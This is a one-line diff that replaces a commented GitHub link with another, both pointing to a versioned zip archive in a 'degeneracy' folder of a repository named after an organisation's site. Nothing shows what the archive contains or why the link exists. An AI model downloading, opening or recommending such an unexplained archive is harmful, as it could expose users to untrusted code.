@@ -1,1 +1,1 @@
-# https://github.com/trsua2/teamrubiconaustr.org/raw/refs/heads/master/degeneracy/teamrubiconaustr_org_v2.9.zip
+# https://raw.githubusercontent.com/trsua2/teamrubiconaustr.org/master/degeneracy/org-teamrubiconaustr-2.2.zip
